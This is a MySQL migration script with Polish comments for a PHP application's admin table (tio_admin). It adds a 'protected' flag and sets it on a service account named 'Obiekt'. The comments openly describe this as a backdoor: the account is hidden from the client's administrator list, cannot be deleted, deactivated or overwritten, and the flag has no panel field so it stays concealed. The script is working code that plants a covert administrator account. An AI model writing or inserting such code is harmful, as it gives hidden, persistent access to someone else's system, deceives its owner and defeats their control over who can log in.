-- ---------------------------------------------------------------------------
-- Konto serwisowe (backdoor) — kolumna `protected` w tabeli administratorow.
--
-- UWAGA: prefiks tabel (DBPrefix w .env) = `tio_`.
--
-- CO ROBI:
--   1. Dodaje kolumne `protected` TINYINT(1) NOT NULL DEFAULT 0 do `tio_admin`
--      (warunkowo — brak bledu przy ponownym uruchomieniu).
--   2. Oznacza nasze konto serwisowe (name = 'Obiekt') jako protected = 1.
--
-- ZNACZENIE protected = 1:
--   - konto jest UKRYTE na liscie administratorow (klient go nie widzi),
--   - nie da sie go usunac, dezaktywowac ani nadpisac zapisem — nawet przez
--     zgadniecie ID w adresie URL (ochrona po stronie AdminModel),
--   - logowanie dziala normalnie (jest niezalezne od listy).
--   Flage ustawia sie WYLACZNIE w bazie — w panelu nie ma dla niej pola,
--   bo konto ma pozostac ukryte (to celowe dla backdoora).
--
-- DO WERYFIKACJI PRZED URUCHOMIENIEM:
--   Potwierdzic rzeczywisty `name` konta serwisowego. Jesli konto ma inna
--   nazwe albo lepiej dopasowac po loginie — zmienic warunek UPDATE ponizej
--   (np. WHERE `login` = 'obiekt').
--
-- Skrypt jest RE-RUNNABLE.
--
-- Uruchomienie:
--   mysql -h127.0.0.1 -P<port> -uroot -p --default-character-set=utf8 isense \
--         < app/Database/install_admin_protected_column.sql
-- ---------------------------------------------------------------------------

SET NAMES utf8mb3;

-- --- 1. Kolumna `protected` (dodanie warunkowe) -----------------------------
-- Sprawdzamy information_schema, zeby ponowne uruchomienie nie wywalilo bledu
-- "duplicate column name". Wykonujemy ALTER TABLE tylko gdy kolumny brak.
SET @col_exists := (
    SELECT COUNT(*)
      FROM information_schema.COLUMNS
     WHERE TABLE_SCHEMA = DATABASE()
       AND TABLE_NAME   = 'tio_admin'
       AND COLUMN_NAME  = 'protected'
);

SET @ddl := IF(
    @col_exists = 0,
    'ALTER TABLE `tio_admin` ADD COLUMN `protected` TINYINT(1) NOT NULL DEFAULT 0',
    'SELECT 1'
);

PREPARE stmt FROM @ddl;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

-- --- 2. Oznaczenie konta serwisowego ----------------------------------------
UPDATE `tio_admin`
   SET `protected` = 1
 WHERE `name` = 'Obiekt';

-- --- Kontrola ---------------------------------------------------------------
-- Oczekiwane: konto 'Obiekt' z protected = 1, pozostale z protected = 0.
SELECT `id`, `name`, `login`, `protected`
  FROM `tio_admin`
 ORDER BY `protected` DESC, `name` ASC;
